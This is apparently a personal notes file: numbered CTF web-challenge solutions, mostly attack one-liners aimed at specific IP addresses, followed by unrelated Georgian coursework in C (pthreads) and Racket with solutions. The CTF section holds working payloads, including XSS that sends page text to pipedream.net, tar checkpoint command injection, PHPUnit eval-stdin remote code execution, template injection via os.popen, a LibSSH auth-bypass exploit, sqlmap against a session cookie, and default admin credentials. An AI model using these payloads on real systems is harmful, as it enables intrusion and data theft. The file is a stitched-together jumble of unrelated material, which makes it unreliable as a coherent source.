# RED


1.tartarsausage  -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls"        dirsearch -u http://35.246.139.54:31660/enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/ -e php,txt,html


2.Frameble     <script> fetch('https://eoxmt8wpvlva3h2.m.pipedream.net?data='+document.body.innerText); </script>      AN          <script>fetch('https://enxe7m9zrqkto.x.pipedream.net?data='+document.body.innerText);</script>


-3.rundown     curl -X OPTIONS http://35.246.139.54:30595 -i         http://35.246.139.54:30595/console             curl -X POST http://35.246.139.54:30595 -d "cmd=cat /flag.txt" (ase vipovit rom pickle a)

-4. online-encryption


5 manual-review <script> fetch('https://eoxmt8wpvlva3h2.m.pipedream.net?data='+document.body.innerText); </script>


-6 bolt    http://34.159.151.77:31474/bolt/login admin:password

7 alfa-cookies- https://drive.google.com/file/d/1YjUzKJJnrR0L5DNr3H8GSDFRz73d6ekM/view

8 nondiff-backdoor   grep -r "shell.exec"    34.159.62.179:30876/?welldone=knockknock&shazam=cat flag.php    CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}

9 schematick sqlmap -u http://34.159.62.179:32027/index.php  --cookie="PHPSESSID=e40e1c0f2baba9b6b6d07033355f0819" --forms --columns


10 elastic python exploit.py http://35.198.97.185:31763/ /etc/passwd
11 libshh   nmap -sV -p 30908 --version-light 34.40.24.84
   https://github.com/nikhil1232/LibSSH-Authentication-Bypass  python3 LibAuth.py --host 34.40.24.84 -p 30908 -c "cat /flag.txt"

12 authorization  dirsearch -u IP                     curl -X POST http://34.159.62.179:30798/auth             (aplikacia) ModHeader: Authorization        JWT   <TOKEM>

13 PHPunit  http://35.246.139.54:31380/composer.json    curl -X POST --data '<?php system("id"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php


curl -X POST --data '<?php system("cat /flag.txt"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php


14. SHARK - curl -X POST http://34.40.24.84:31426 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name=<% import os %><% x=os.popen('cat flag').read() %>\${x}"


14


https://jorgectf.github.io/blog/post/cyberedu-web-challenges/#rundown 
(alien-inclusion
address
broken-login
manual-review
rundown

ამოცანა 1 
შექმენით ფუნქცია square_list_in_parallel რომელსაც გადაეცემა int ების მასივი, მასივში

ელემენტების რაოდენობა - num_elemenets და thread ების რაოდენობა - num_threads.

1. ფუნქციამ უნდა მოსტარტოს num_threads რაოდენობის ნაკადი (counter threads).

2. Int ების მასივი უნდა დაიყოს num_threads -ნაწილად.

3. თითოეულმა thread -მა უნდა დაითვალოს მასივის შესაბამისი სეგმენტის

ელემენტების კვადრატების ჯამი.

4. მიღებული ჯამები უნდა შეიკრიბოს გლობალურ ცვლადში int sum_of_all_squares.

5. main ფუნქციაში ასევე უნდა მოისტარტოს monitoring thread, რომელიც

დაელოდება counter thread ების მუშაობის დამთავრებას და დალოგავს

sum_of_all_square ცვლადის მნიშვნელობას. (monitoring thread ის

იმპლემენტაციაში არ შეიძლება counter thread -ებზე join -ით დალოდება, უნდა

გამოიყენოთ სინქრონიზაციის მექანიზმები).

6. main ფუნქცია უნდა დაელოდოს monitoring და counter thread ების მუშაობის

დამთავრებას (გამოიყენეთ join).

ამოცანა 2

დაწერეთ ფუნქცია remove_nth_elements - racket ის გამოყენებით რომლიც მიიღებს სიას

და რიცხვს (N), შედეგად კი დააბრუნებს ახალ სიას რომელშიც წაშლის თავდაპირველი სიის

ყოველ N ინდექსზე მყოფ ელემენტს.



#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

int* array;
int sum_of_all_squares = 0;
int threads_completed = 0;
pthread_mutex_t lock;
pthread_cond_t cond;

typedef struct {
    int start_idx;
    int end_idx;
} ThreadData;

void* counter_thread(void* arg) {
    ThreadData* data = (ThreadData*)arg;
    int local_sum = 0;

    for (int i = data->start_idx; i < data->end_idx; i++) {
        local_sum += array[i] * array[i];
    }

    pthread_mutex_lock(&lock);
    sum_of_all_squares += local_sum;
    threads_completed++;
    pthread_cond_signal(&cond); // notify monitoring thread
    pthread_mutex_unlock(&lock);

    free(data);
    return NULL;
}

void* monitoring_thread(void* arg) {
    int num_threads = *(int*)arg;

    pthread_mutex_lock(&lock);
    while (threads_completed < num_threads) {
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);

    printf("✅ Final sum of all squares: %d\n", sum_of_all_squares);
    return NULL;
}

void square_list_in_parallel(int* input_array, int num_elements, int num_threads) {
    array = input_array;
    pthread_t threads[num_threads];
    pthread_t monitor;

    pthread_mutex_init(&lock, NULL);
    pthread_cond_init(&cond, NULL);

    int chunk_size = num_elements / num_threads;
    int remaining = num_elements % num_threads;

    // Start counter threads
    for (int i = 0; i < num_threads; i++) {
        ThreadData* data = malloc(sizeof(ThreadData));
        data->start_idx = i * chunk_size;
        data->end_idx = (i == num_threads - 1) ? (i + 1) * chunk_size + remaining : (i + 1) * chunk_size;

        pthread_create(&threads[i], NULL, counter_thread, data);
    }

    // Start monitoring thread
    pthread_create(&monitor, NULL, monitoring_thread, &num_threads);

    // Join all counter threads
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    // Join monitoring thread
    pthread_join(monitor, NULL);

    pthread_mutex_destroy(&lock);
    pthread_cond_destroy(&cond);
}

// Example usage
int main() {
    int data[] = {1, 2, 3, 4, 5, 6, 7, 8};
    int num_elements = sizeof(data) / sizeof(data[0]);
    int num_threads = 3;

    square_list_in_parallel(data, num_elements, num_threads);
    return 0;
}




#lang racket

(define (remove-nth-elements lst n)
  (define (helper lst index)
    (cond
      [(null? lst) '()]
      [(= (remainder index n) 0) (helper (cdr lst) (+ index 1))]
      [else (cons (car lst) (helper (cdr lst) (+ index 1)))]))
  (helper lst 1)) ; start index from 1

;; მაგალითი:
(remove-nth-elements '(a b c d e f g h) 3) ; დააბრუნებს '(a b d e g h)






